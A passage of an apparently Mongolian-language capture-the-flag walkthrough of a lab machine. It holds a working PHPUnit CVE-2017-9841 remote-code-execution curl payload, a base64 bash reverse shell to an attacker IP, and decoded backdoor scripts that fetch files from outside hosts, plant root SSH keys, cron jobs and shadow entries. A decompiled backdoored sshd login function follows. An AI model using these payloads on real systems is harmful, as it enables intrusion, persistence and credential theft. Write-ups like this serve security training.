</span></span><span style=display:flex><span>/fonts                <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 324<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; http://store.djewelry.htb/fonts/<span style=color:#f92672>]</span> 
</span></span><span style=display:flex><span>/server-status        <span style=color:#f92672>(</span>Status: 403<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 283<span style=color:#f92672>]</span>                                        <span style=color:#f92672>[[</span>1;5C
</span></span><span style=display:flex><span>Progress: <span style=color:#ae81ff>152160</span> / <span style=color:#ae81ff>220561</span> <span style=color:#f92672>(</span>68.99%<span style=color:#f92672>)</span>                                                    <span style=color:#f92672>[</span>ERROR<span style=color:#f92672>]</span> 2022/03/08 06:07:42 <span style=color:#f92672>[</span>!<span style=color:#f92672>]</span> context deadline exceeded <span style=color:#f92672>(</span>Client.Timeout or context cancellation <span style=color:#66d9ef>while</span> reading body<span style=color:#f92672>)</span>
</span></span></code></pre></div><p><code>vendor</code><figure><img loading=lazy src=/images/undetected_post_image_1.png></figure></p><h3 id=4-cve-2017-9841>4. CVE-2017-9841<a hidden class=anchor aria-hidden=true href=#4-cve-2017-9841>#</a></h3><p>cli:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ curl --data <span style=color:#e6db74>&#34;&lt;?php echo(pi());&#34;</span> http://localhost:8888/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Source: http://web.archive.org/web/20170701212357/http://phpunit.vulnbusters.com/
</span></span></code></pre></div><p>cli:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>curl --data <span style=color:#e6db74>&#34;&lt;?php echo(pi());&#34;</span> http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
</span></span><span style=display:flex><span><span style=color:#75715e>##</span>
</span></span><span style=display:flex><span>3.1415926535898
</span></span></code></pre></div><p>cli:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>curl --data <span style=color:#e6db74>&#34;&lt;?php echo(shell_exec(&#39;whoami&#39;));?&gt;&#34;</span> http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
</span></span><span style=display:flex><span><span style=color:#75715e>##</span>
</span></span><span style=display:flex><span>www-data
</span></span></code></pre></div><h4 id=41-reverse-shell>4.1 Reverse shell<a hidden class=anchor aria-hidden=true href=#41-reverse-shell>#</a></h4><p>cli:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>echo <span style=color:#e6db74>&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.68/9001 0&gt;&amp;1&#34;</span> | base64
</span></span><span style=display:flex><span><span style=color:#75715e>##</span>
</span></span><span style=display:flex><span>YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42OC85MDAxIDA+JjEK
</span></span><span style=display:flex><span><span style=color:#75715e>##</span>
</span></span><span style=display:flex><span>curl --data <span style=color:#e6db74>&#34; &lt;?php echo(shell_exec(&#39;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42OC85MDAxIDA+JjEK | base64 -d | bash&#39;));?&gt;&#34;</span> http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
</span></span><span style=display:flex><span><span style=color:#75715e>##</span>
</span></span><span style=display:flex><span>nc -lvnp <span style=color:#ae81ff>9001</span>
</span></span></code></pre></div><figure><img loading=lazy src=/images/undetected_post_image_2.png></figure><h4 id=42-shell-balance>4.2 Shell balance<a hidden class=anchor aria-hidden=true href=#42-shell-balance>#</a></h4><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>python3 -c <span style=color:#e6db74>&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span></code></pre></div><p>ctrl+z</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>stty raw -echo
</span></span></code></pre></div><p><code>f+g [enter enter]</code>
буцаад nc орлоо</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>export TERM<span style=color:#f92672>=</span>xterm
</span></span></code></pre></div><h4 id=43-steven1>4.3 steven1<a hidden class=anchor aria-hidden=true href=#43-steven1>#</a></h4><p>passwd:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-txt data-lang=txt><span style=display:flex><span>steven1:x:1000:1000:,,,:/home/steven:/bin/bash
</span></span></code></pre></div><p>steven1</p><p>linpeas хэрэгтэй олдоц:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>-r-x------ <span style=color:#ae81ff>1</span> www-data www-data <span style=color:#ae81ff>27296</span> May <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2021</span> /var/backups/info
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>17793</span>      <span style=color:#ae81ff>4</span> -rw-rw----   <span style=color:#ae81ff>1</span> steven   mail          <span style=color:#ae81ff>966</span> Jul <span style=color:#ae81ff>25</span>  <span style=color:#ae81ff>2021</span> /var/mail/steven
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>17793</span>      <span style=color:#ae81ff>4</span> -rw-rw----   <span style=color:#ae81ff>1</span> steven   mail          <span style=color:#ae81ff>966</span> Jul <span style=color:#ae81ff>25</span>  <span style=color:#ae81ff>2021</span> /var/spool/mail/steven
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>╔══════════╣ Sudo version                                                                                                                                          
</span></span><span style=display:flex><span>╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version                                                                                         
</span></span><span style=display:flex><span>Sudo version 1.8.31 
</span></span></code></pre></div><p>info -г local machine руу хуулаад харвал:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>strings info | less
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>/bin/bash
</span></span><span style=display:flex><span>776765742074656d7066696c65732e78797a2f617574686f72697a65645f6b657973202d4f202f726f6f742f2e7373682f617574686f72697a65645f6b6579733b20776765742074656d7066696c65732e78797a2f2e6d61696e202d4f202f7661722f6c69622f2e6d61696e3b2063686d6f6420373535202f7661722f6c69622f2e6d61696e3b206563686f20222a2033202a202a202a20726f6f74202f7661722f6c69622f2e6d61696e22203e3e202f6574632f63726f6e7461623b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122313a5c24365c247a5337796b4866464d673361596874345c2431495572685a616e5275445a6866316f49646e6f4f76586f6f6c4b6d6c77626b656742586b2e567447673738654c3757424d364f724e7447625a784b427450753855666d39684d30522f424c6441436f513054396e2f3a31383831333a303a39393939393a373a3a3a203e3e202f6574632f736861646f7722297d27202f6574632f7061737377643b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122202224332220222436222022243722203e2075736572732e74787422297d27202f6574632f7061737377643b207768696c652072656164202d7220757365722067726f757020686f6d65207368656c6c205f3b20646f206563686f202224757365722231223a783a2467726f75703a2467726f75703a2c2c2c3a24686f6d653a247368656c6c22203e3e202f6574632f7061737377643b20646f6e65203c2075736572732e7478743b20726d2075736572732e7478743b
</span></span></code></pre></div><p><code>xxd -r -p</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>echo 776765742074656d7066696c65732e78797a2f617574686f72697a65645f6b657973202d4f202f726f6f742f2e7373682f617574686f72697a65645f6b6579733b20776765742074656d7066696c65732e78797a2f2e6d61696e202d4f202f7661722f6c69622f2e6d61696e3b2063686d6f6420373535202f7661722f6c69622f2e6d61696e3b206563686f20222a2033202a202a202a20726f6f74202f7661722f6c69622f2e6d61696e22203e3e202f6574632f63726f6e7461623b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122313a5c24365c247a5337796b4866464d673361596874345c2431495572685a616e5275445a6866316f49646e6f4f76586f6f6c4b6d6c77626b656742586b2e567447673738654c3757424d364f724e7447625a784b427450753855666d39684d30522f424c6441436f513054396e2f3a31383831333a303a39393939393a373a3a3a203e3e202f6574632f736861646f7722297d27202f6574632f7061737377643b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122202224332220222436222022243722203e2075736572732e74787422297d27202f6574632f7061737377643b207768696c652072656164202d7220757365722067726f757020686f6d65207368656c6c205f3b20646f206563686f202224757365722231223a783a2467726f75703a2467726f75703a2c2c2c3a24686f6d653a247368656c6c22203e3e202f6574632f7061737377643b20646f6e65203c2075736572732e7478743b20726d2075736572732e7478743b | xxd -r -p
</span></span></code></pre></div><p>Output:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>wget tempfiles.xyz/authorized_keys -O /root/.ssh/authorized_keys; wget tempfiles.xyz/.main -O /var/lib/.main; chmod <span style=color:#ae81ff>755</span> /var/lib/.main; echo <span style=color:#e6db74>&#34;* 3 * * * root /var/lib/.main&#34;</span> &gt;&gt; /etc/crontab; awk -F<span style=color:#e6db74>&#34;:&#34;</span> <span style=color:#e6db74>&#39;$7 == &#34;/bin/bash&#34; &amp;&amp; $3 &gt;= 1000 {system(&#34;echo &#34;$1&#34;1:\$6\$zS7ykHfFMg3aYht4\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7::: &gt;&gt; /etc/shadow&#34;)}&#39;</span> /etc/passwd; awk -F<span style=color:#e6db74>&#34;:&#34;</span> <span style=color:#e6db74>&#39;$7 == &#34;/bin/bash&#34; &amp;&amp; $3 &gt;= 1000 {system(&#34;echo &#34;$1&#34; &#34;$3&#34; &#34;$6&#34; &#34;$7&#34; &gt; users.txt&#34;)}&#39;</span> /etc/passwd; <span style=color:#66d9ef>while</span> read -r user group home shell _; <span style=color:#66d9ef>do</span> echo <span style=color:#e6db74>&#34;</span>$user<span style=color:#e6db74>&#34;</span>1<span style=color:#e6db74>&#34;:x:</span>$group<span style=color:#e6db74>:</span>$group<span style=color:#e6db74>:,,,:</span>$home<span style=color:#e6db74>:</span>$shell<span style=color:#e6db74>&#34;</span> &gt;&gt; /etc/passwd; <span style=color:#66d9ef>done</span> &lt; users.txt; rm users.txt;
</span></span></code></pre></div><p>hash</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$11:$6$zS7ykHfFMg3aYht4$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7:::
</span></span></code></pre></div><p>өөрчлөлт <code>\</code>-г хасаж, <code>$11</code> - нэмсэн</p><h4 id=44-hash>4.4 Hash<a hidden class=anchor aria-hidden=true href=#44-hash>#</a></h4><p>rockyou:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>ls -lh /usr/share/wordlists/
</span></span><span style=display:flex><span>gunzip /usr/share/wordlists/rockyou.txt.gz
</span></span></code></pre></div><p>cli:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>john hash --wordlist<span style=color:#f92672>=</span>/usr/share/wordlists/rockyou.txt
</span></span></code></pre></div><p>out:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>Using default input encoding: UTF-8
</span></span><span style=display:flex><span>Loaded <span style=color:#ae81ff>1</span> password hash <span style=color:#f92672>(</span>sha512crypt, crypt<span style=color:#f92672>(</span>3<span style=color:#f92672>)</span> $6$ <span style=color:#f92672>[</span>SHA512 128/128 AVX 2x<span style=color:#f92672>])</span>
</span></span><span style=display:flex><span>Cost <span style=color:#ae81ff>1</span> <span style=color:#f92672>(</span>iteration count<span style=color:#f92672>)</span> is <span style=color:#ae81ff>5000</span> <span style=color:#66d9ef>for</span> all loaded hashes
</span></span><span style=display:flex><span>Will run <span style=color:#ae81ff>4</span> OpenMP threads
</span></span><span style=display:flex><span>Press <span style=color:#e6db74>&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style=color:#66d9ef>for</span> status
</span></span><span style=display:flex><span>ihatehackers     <span style=color:#f92672>(</span>$11<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>1g 0:00:00:40 DONE <span style=color:#f92672>(</span>2022-03-08 07:20<span style=color:#f92672>)</span> 0.02484g/s 2213p/s 2213c/s 2213C/s jojo95..halo03
</span></span><span style=display:flex><span>Use the <span style=color:#e6db74>&#34;--show&#34;</span> option to display all of the cracked passwords reliably
</span></span><span style=display:flex><span>Session completed
</span></span></code></pre></div><p><code>steven1</code>
<code>ihatehackers</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>su steven1
</span></span><span style=display:flex><span><span style=color:#75715e>## id</span>
</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>steven<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>steven<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>steven<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>user.txt</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-txt data-lang=txt><span style=display:flex><span>82bf31*******
</span></span></code></pre></div><h3 id=5-privilege-escalation>5. Privilege escalation<a hidden class=anchor aria-hidden=true href=#5-privilege-escalation>#</a></h3><p>cli:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>ssh steven1@10.10.11.146
</span></span></code></pre></div><p><code>/var/mail/steven</code>:</p><pre tabindex=0><code>Received: from production (localhost [127.0.0.1])
        by production (8.15.2/8.15.2/Debian-18) with ESMTP id 80FAcdZ171847
        for &lt;steven@production&gt;; Sun, 25 Jul 2021 10:31:12 GMT
Received: (from root@localhost)
        by production (8.15.2/8.15.2/Submit) id 80FAcdZ171847;
        Sun, 25 Jul 2021 10:31:12 GMT
Date: Sun, 25 Jul 2021 10:31:12 GMT
Message-Id: &lt;202107251031.80FAcdZ171847@production&gt;
To: steven@production
From: root@production
Subject: Investigations

Hi Steven.

We recently updated the system but are still experiencing some strange behaviour with the Apache service.
We have temporarily moved the web store and database to another server whilst investigations are underway.
If for any reason you need access to the database or web application code, get in touch with Mark and he
will generate a temporary password for you to authenticate to the temporary server.

Thanks,
sysadmin
</code></pre><p>cli:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>find / -type d 2&gt;/dev/null | grep -i apache2
</span></span></code></pre></div><figure><img loading=lazy src=/images/undetected_post_image_3.png></figure><p>``/usr/lib/apache2/modules<code> </code>-ltrh` - сүүлийн өөрчлөлт</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>steven@production:/usr/lib/apache2/modules$ ls -ltrh                                                                                                               
</span></span><span style=display:flex><span>total 8.6M                                                                                                                                                         
</span></span><span style=display:flex><span>-rw-r--r-- <span style=color:#ae81ff>1</span> root root  34K May <span style=color:#ae81ff>17</span>  <span style=color:#ae81ff>2021</span> mod_reader.so                                                                                                             
</span></span><span style=display:flex><span>-rw-r--r-- <span style=color:#ae81ff>1</span> root root 4.5M Nov <span style=color:#ae81ff>25</span> 23:16 libphp7.4.so 
</span></span></code></pre></div><h4 id=51-ghidra>5.1 Ghidra:<a hidden class=anchor aria-hidden=true href=#51-ghidra>#</a></h4><p><a href=https://github.com/NationalSecurityAgency/ghidra/releases>https://github.com/NationalSecurityAgency/ghidra/releases</a></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>unzip ghidra_*_PUBLIC_*.zip
</span></span></code></pre></div><p>mod_reader.so</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Local VM:</span>
</span></span><span style=display:flex><span>nc -lvnp <span style=color:#ae81ff>9001</span> &gt; mod_reader.so
</span></span><span style=display:flex><span><span style=color:#75715e># Machine VM:</span>
</span></span><span style=display:flex><span>nc 10.10.14.68 <span style=color:#ae81ff>9001</span> &lt; mode_reader.so
</span></span></code></pre></div><p><code>md5sum</code> хоёр талд шалгана.</p><p><code>strings</code> комманд ашиглан шалгана.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># strings mod_reader.so</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Base64</span>
</span></span><span style=display:flex><span>d2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk
</span></span></code></pre></div><p>base64 decode:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>echo d2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk | base64 -d
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>wget sharefiles.xyz/image.jpeg -O /usr/sbin/sshd; touch -d <span style=color:#e6db74>`</span>date +%Y-%m-%d -r /usr/sbin/a2enmod<span style=color:#e6db74>`</span> /usr/sbin/sshd
</span></span></code></pre></div><p><code>/usr/sbin/sshd</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Machine VM</span>
</span></span><span style=display:flex><span>cd /usr/sbin
</span></span><span style=display:flex><span>ls -al | grep -i sshd
</span></span><span style=display:flex><span><span style=color:#75715e># result</span>
</span></span><span style=display:flex><span>steven@production:/usr/sbin$ ls -al | grep -i sshd
</span></span><span style=display:flex><span>-rwxr-xr-x  <span style=color:#ae81ff>1</span> root root   <span style=color:#ae81ff>3644664</span> Apr <span style=color:#ae81ff>13</span>  <span style=color:#ae81ff>2020</span> sshd
</span></span></code></pre></div><p>sshd <code>Ghidra</code><figure><img loading=lazy src=/images/undetected_post_image_4.png></figure>Decompile<figure><img loading=lazy src=/images/undetected_post_image_5.png></figure></p><p><code>decomiple.c</code> дотор бүгдийн save:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>cat decomiple.c 
</span></span><span style=display:flex><span><span style=color:#75715e>###
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#75715e>/* WARNING: Could not reconcile some variable overlaps */</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>auth_password</span>(ssh <span style=color:#f92672>*</span>ssh,<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>password)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  Authctxt <span style=color:#f92672>*</span>ctxt;
</span></span><span style=display:flex><span>  passwd <span style=color:#f92672>*</span>ppVar1;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> iVar2;
</span></span><span style=display:flex><span>  uint uVar3;
</span></span><span style=display:flex><span>  byte <span style=color:#f92672>*</span>pbVar4;
</span></span><span style=display:flex><span>  byte <span style=color:#f92672>*</span>pbVar5;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>size_t</span> sVar6;
</span></span><span style=display:flex><span>  byte bVar7;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> iVar8;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>long</span> in_FS_OFFSET;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>char</span> backdoor [<span style=color:#ae81ff>31</span>];
</span></span><span style=display:flex><span>  byte local_39 [<span style=color:#ae81ff>9</span>];
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>long</span> local_30;
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>  bVar7 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xd6</span>;
</span></span><span style=display:flex><span>  ctxt <span style=color:#f92672>=</span> (Authctxt <span style=color:#f92672>*</span>)ssh<span style=color:#f92672>-&gt;</span>authctxt;
</span></span><span style=display:flex><span>  local_30 <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>(<span style=color:#66d9ef>long</span> <span style=color:#f92672>*</span>)(in_FS_OFFSET <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x28</span>);
</span></span><span style=display:flex><span>  backdoor._28_2_ <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xa9f4</span>;
</span></span><span style=display:flex><span>  ppVar1 <span style=color:#f92672>=</span> ctxt<span style=color:#f92672>-&gt;</span>pw;
</span></span><span style=display:flex><span>  iVar8 <span style=color:#f92672>=</span> ctxt<span style=color:#f92672>-&gt;</span>valid;
</span></span><span style=display:flex><span>  backdoor._24_4_ <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xbcf0b5e3</span>;
</span></span><span style=display:flex><span>  backdoor._16_8_ <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xb2d6f4a0fda0b3d6</span>;
</span></span><span style=display:flex><span>  backdoor[<span style=color:#ae81ff>30</span>] <span style=color:#f92672>=</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>0x5b</span>;
</span></span><span style=display:flex><span>  backdoor._0_4_ <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xf0e7abd6</span>;
</span></span><span style=display:flex><span>  backdoor._4_4_ <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xa4b3a3f3</span>;
</span></span><span style=display:flex><span>  backdoor._8_4_ <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xf7bbfdc8</span>;
</span></span><span style=display:flex><span>  backdoor._12_4_ <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xfdb3d6e7</span>;
</span></span><span style=display:flex><span>  pbVar4 <span style=color:#f92672>=</span> (byte <span style=color:#f92672>*</span>)backdoor;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>while</span>( true ) {
</span></span><span style=display:flex><span>    pbVar5 <span style=color:#f92672>=</span> pbVar4 <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>    <span style=color:#f92672>*</span>pbVar4 <span style=color:#f92672>=</span> bVar7 <span style=color:#f92672>^</span> <span style=color:#ae81ff>0x96</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (pbVar5 <span style=color:#f92672>==</span> local_39) <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>    bVar7 <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>pbVar5;
</span></span><span style=display:flex><span>    pbVar4 <span style=color:#f92672>=</span> pbVar5;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  iVar2 <span style=color:#f92672>=</span> <span style=color:#a6e22e>strcmp</span>(password,backdoor);
</span></span><span style=display:flex><span>  uVar3 <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (iVar2 <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>) {
</span></span><span style=display:flex><span>    sVar6 <span style=color:#f92672>=</span> <span style=color:#a6e22e>strlen</span>(password);
</span></span><span style=display:flex><span>    uVar3 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (sVar6 <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0x401</span>) {
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>if</span> ((ppVar1<span style=color:#f92672>-&gt;</span>pw_uid <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) <span style=color:#f92672>&amp;&amp;</span> (options.permit_root_login <span style=color:#f92672>!=</span> <span style=color:#ae81ff>3</span>)) {
</span></span><span style=display:flex><span>        iVar8 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>      }
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>if</span> ((<span style=color:#f92672>*</span>password <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#39;\0&#39;</span>) <span style=color:#f92672>||</span>
</span></span><span style=display:flex><span>         (uVar3 <span style=color:#f92672>=</span> options.permit_empty_passwd, options.permit_empty_passwd <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>)) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (auth_password<span style=color:#f92672>::</span>expire_checked <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
</span></span><span style=display:flex><span>          auth_password<span style=color:#f92672>::</span>expire_checked <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>          iVar2 <span style=color:#f92672>=</span> <span style=color:#a6e22e>auth_shadow_pwexpired</span>(ctxt);
</span></span><span style=display:flex><span>          <span style=color:#66d9ef>if</span> (iVar2 <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>) {
</span></span><span style=display:flex><span>            ctxt<span style=color:#f92672>-&gt;</span>force_pwchange <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>          }
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        iVar2 <span style=color:#f92672>=</span> <span style=color:#a6e22e>sys_auth_passwd</span>(ssh,password);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (ctxt<span style=color:#f92672>-&gt;</span>force_pwchange <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>) {
</span></span><span style=display:flex><span>          <span style=color:#a6e22e>auth_restrict_session</span>(ssh);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        uVar3 <span style=color:#f92672>=</span> (uint)(iVar2 <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span> <span style=color:#f92672>&amp;&amp;</span> iVar8 <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>      }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (local_30 <span style=color:#f92672>==</span> <span style=color:#f92672>*</span>(<span style=color:#66d9ef>long</span> <span style=color:#f92672>*</span>)(in_FS_OFFSET <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x28</span>)) {
